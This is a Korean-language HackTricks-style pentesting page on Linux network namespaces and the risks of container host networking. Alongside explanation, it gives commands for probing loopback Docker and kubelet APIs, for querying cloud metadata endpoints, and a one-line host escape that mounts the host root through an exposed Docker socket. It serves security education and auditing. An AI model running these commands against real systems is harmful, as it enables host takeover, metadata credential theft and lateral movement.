# 네트워크 네임스페이스

{{#include ../../../../../banners/hacktricks-training.md}}

## 개요

네트워크 네임스페이스는 인터페이스, IP 주소, 라우팅 테이블, ARP/neighbor 상태, 방화벽 규칙, 소켓, 그리고 `/proc/net` 같은 파일의 내용 등 네트워크 관련 리소스를 격리합니다. 이 때문에 컨테이너는 호스트의 실제 네트워크 스택을 소유하지 않으면서도 자신의 `eth0`, 로컬 라우트, 루프백 장치를 가진 것처럼 보일 수 있습니다.

보안 측면에서 보면 네트워크 격리는 단순한 포트 바인딩 이상의 의미를 가집니다. 프라이빗 네트워크 네임스페이스는 워크로드가 직접 관찰하거나 재구성할 수 있는 범위를 제한합니다. 해당 네임스페이스가 호스트와 공유되면, 컨테이너는 애플리케이션에 노출될 의도가 없던 호스트 리스너, 호스트-로컬 서비스, 네트워크 제어 지점들을 갑자기 볼 수 있게 됩니다.

## 동작

새로 생성된 네트워크 네임스페이스는 인터페이스가 연결될 때까지 비어 있거나 거의 비어 있는 네트워크 환경으로 시작합니다. 컨테이너 런타임은 그 다음 가상 인터페이스를 생성하거나 연결하고, 주소를 할당하며, 워크로드가 기대하는 연결성을 갖추도록 라우트를 구성합니다. 브리지 기반 배포에서는 보통 컨테이너가 호스트 브리지에 연결된 veth-backed 인터페이스를 보게 됩니다. Kubernetes에서는 CNI 플러그인이 Pod 네트워킹에 대한 동등한 설정을 처리합니다.

이 구조는 `--network=host` 또는 `hostNetwork: true`가 왜 큰 변화인지 설명합니다. 준비된 프라이빗 네트워크 스택을 받는 대신 워크로드는 호스트의 실제 네트워크 스택에 합류합니다.

## 실습

다음으로 거의 비어 있는 네트워크 네임스페이스를 볼 수 있습니다:
```bash
sudo unshare --net --fork bash
ip addr
ip route
```
그리고 일반 컨테이너와 호스트 네트워크를 사용하는 컨테이너를 다음과 같이 비교할 수 있습니다:
```bash
docker run --rm debian:stable-slim sh -c 'ip addr || ifconfig'
docker run --rm --network=host debian:stable-slim sh -c 'ss -lntp | head'
```
The host-networked container은 더 이상 자체적으로 격리된 소켓 및 인터페이스 뷰를 갖지 않습니다. 이 변화만으로도 프로세스가 어떤 capabilities를 가지고 있는지 묻기 이전에 이미 중요한 의미를 가집니다.

## Runtime Usage

Docker와 Podman은 별도로 구성하지 않는 한 각 container에 대해 보통 private network namespace를 생성합니다. Kubernetes는 보통 각 Pod에 자체 network namespace를 부여하며, 해당 Pod 내부의 containers들이 이를 공유하지만 호스트와는 분리됩니다. Incus/LXC 시스템도 다양한 가상 네트워킹 설정을 갖춘 풍부한 network-namespace 기반 격리를 제공합니다.

공통 원칙은 private networking이 기본 격리 경계이며, 호스트 네트워킹은 그 경계에서 명시적으로 옵트아웃하는 것이라는 점입니다.

## Misconfigurations

가장 중요한 잘못된 구성은 단순히 호스트의 네트워크 네임스페이스를 공유하는 것입니다. 이는 성능, 저수준 모니터링, 편의성 때문에 가끔 사용되지만, containers에 제공되는 가장 명확한 경계 중 하나를 제거합니다. 호스트-로컬 리스너는 보다 직접적으로 도달 가능해지고, localhost-only 서비스가 접근 가능해질 수 있으며, `CAP_NET_ADMIN` 또는 `CAP_NET_RAW` 같은 권한은 이제 그 권한으로 가능한 작업들이 호스트 자신의 네트워크 환경에 적용되기 때문에 훨씬 더 위험해집니다.

또 다른 문제는 네트워크 네임스페이스가 private일 때조차 네트워크 관련 권한을 과다하게 부여하는 것입니다. private namespace는 도움이 되지만, 그것이 raw sockets나 고급 네트워크 제어를 무해하게 만드는 것은 아닙니다.

Kubernetes에서 `hostNetwork: true`는 Pod 수준의 네트워크 분할을 얼마나 신뢰할 수 있는지에도 변화를 줍니다. Kubernetes 문서는 많은 네트워크 플러그인이 `hostNetwork` Pod 트래픽을 `podSelector` / `namespaceSelector` 매칭을 위해 제대로 구별하지 못해 이를 일반적인 노드 트래픽으로 처리한다고 설명합니다. 공격자의 관점에서 이는 손상된 `hostNetwork` 워크로드를 오버레이 네트워크 워크로드와 동일한 정책 가정으로 여전히 제약된 일반 Pod로 보기보다는 노드 수준의 네트워크 발판(node-level network foothold)으로 간주해야 함을 뜻합니다.

## Abuse

격리가 약한 환경에서는 공격자가 호스트에서 리스닝 중인 서비스들을 조사하거나, loopback에만 바인딩된 관리 엔드포인트에 접근하거나, 정확한 권한과 환경에 따라 트래픽을 스니핑하거나 간섭할 수 있으며, `CAP_NET_ADMIN`이 존재하는 경우 라우팅 및 방화벽 상태를 재구성할 수도 있습니다. 클러스터 환경에서는 이것이 lateral movement 및 컨트롤 플레인 정찰을 더 쉽게 만들 수 있습니다.

호스트 네트워킹이 의심되면, 먼저 보이는 인터페이스와 리스너가 격리된 container 네트워크가 아니라 호스트에 속하는지 확인하세요:
```bash
ip addr
ip route
ss -lntup | head -n 50
```
루프백 전용 서비스는 종종 첫 번째로 흥미로운 발견입니다:
```bash
ss -lntp | grep '127.0.0.1'
curl -s http://127.0.0.1:2375/version 2>/dev/null
curl -sk https://127.0.0.1:2376/version 2>/dev/null
```
network capabilities가 있는 경우, workload가 보이는 stack을 검사하거나 변경할 수 있는지 테스트하세요:
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link show
```
최신 커널에서는 host networking과 `CAP_NET_ADMIN`의 조합이 단순한 `iptables` / `nftables` 변경을 넘어 패킷 경로를 노출할 수 있습니다. `tc` qdiscs와 filters도 namespace-scoped이므로, 호스트 네트워크 네임스페이스를 공유하는 경우 컨테이너가 볼 수 있는 호스트 인터페이스에 적용됩니다. 추가로 `CAP_BPF`가 있으면 TC 및 XDP 로더와 같은 네트워크 관련 eBPF 프로그램도 관련되어 중요해집니다:
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw|cap_bpf'
for i in $(ls /sys/class/net 2>/dev/null); do
echo "== $i =="
tc qdisc show dev "$i" 2>/dev/null
tc filter show dev "$i" ingress 2>/dev/null
tc filter show dev "$i" egress 2>/dev/null
done
bpftool net 2>/dev/null
```
이것이 중요한 이유는 attacker가 host interface 수준에서 트래픽을 mirror, redirect, shape 또는 drop할 수 있기 때문이며, 단지 firewall rules을 재작성하는 것에 그치지 않기 때문입니다. private network namespace에서는 이러한 동작들이 container view에 국한되지만, shared host namespace에서는 host-impacting이 됩니다.

cluster 또는 cloud 환경에서는, host networking이 metadata 및 control-plane-adjacent services에 대한 빠른 local recon을 정당화하기도 합니다:
```bash
for u in \
http://169.254.169.254/latest/meta-data/ \
http://100.100.100.200/latest/meta-data/ \
http://127.0.0.1:10250/pods; do
curl -m 2 -s "$u" 2>/dev/null | head
done
```
### 전체 예제: Host Networking + Local Runtime / Kubelet Access

Host networking은 자동으로 host root를 제공하지는 않지만, 종종 노드 자체에서만 접근 가능하도록 의도된 서비스들을 노출합니다. 그 서비스들 가운데 하나가 취약하게 보호되어 있다면, host networking은 직접적인 privilege-escalation 경로가 됩니다.

Docker API on localhost:
```bash
curl -s http://127.0.0.1:2375/version 2>/dev/null
docker -H tcp://127.0.0.1:2375 run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
localhost의 Kubelet:
```bash
curl -k https://127.0.0.1:10250/pods 2>/dev/null | head
curl -k https://127.0.0.1:10250/runningpods/ 2>/dev/null | head
```
영향:

- 로컬 runtime API가 적절히 보호되지 않은 채 노출되면 호스트가 직접 침해될 수 있음
- kubelet 또는 로컬 에이전트에 접근할 수 있는 경우 클러스터 정찰 또는 lateral movement 발생 가능
- `CAP_NET_ADMIN`과 결합될 때 트래픽 조작 또는 서비스 거부(DoS) 발생 가능

## 검사

이 검사들의 목표는 프로세스가 프라이빗 네트워크 스택을 보유하고 있는지, 어떤 라우트와 리스너가 보이는지, 그리고 capabilities를 테스트하기 전에 네트워크 뷰가 이미 호스트와 유사한지 여부를 파악하는 것이다.
```bash
readlink /proc/self/ns/net   # Current network namespace identifier
readlink /proc/1/ns/net      # Compare with PID 1 in the current container / pod
lsns -t net 2>/dev/null      # Reachable network namespaces from this view
ip netns identify $$ 2>/dev/null
ip addr                      # Visible interfaces and addresses
ip route                     # Routing table
ss -lntup                    # Listening TCP/UDP sockets with process info
```
- If `/proc/self/ns/net` and `/proc/1/ns/net` already look host-like, the container may be sharing the host network namespace or another non-private namespace.
- `lsns -t net` and `ip netns identify` are useful when the shell is already inside a named or persistent namespace and you want to correlate it with `/run/netns` objects from the host side.
- `ss -lntup` is especially valuable because it reveals loopback-only listeners and local management endpoints.
- Routes, interface names, firewall context, `tc` state, and eBPF attachments become much more important if `CAP_NET_ADMIN`, `CAP_NET_RAW`, or `CAP_BPF` is present.
- In Kubernetes, failed service-name resolution from a `hostNetwork` Pod may simply mean the Pod is not using `dnsPolicy: ClusterFirstWithHostNet`, not that the service is absent.

When reviewing a container, always evaluate the network namespace together with the capability set. Host networking plus strong network capabilities is a very different posture from bridge networking plus a narrow default capability set.

## References

- [Kubernetes NetworkPolicy and `hostNetwork` caveats](https://kubernetes.io/docs/concepts/services-networking/network-policies/)
- [eBPF token and capability requirements for network-related eBPF programs](https://docs.ebpf.io/linux/concepts/token/)
{{#include ../../../../../banners/hacktricks-training.md}}
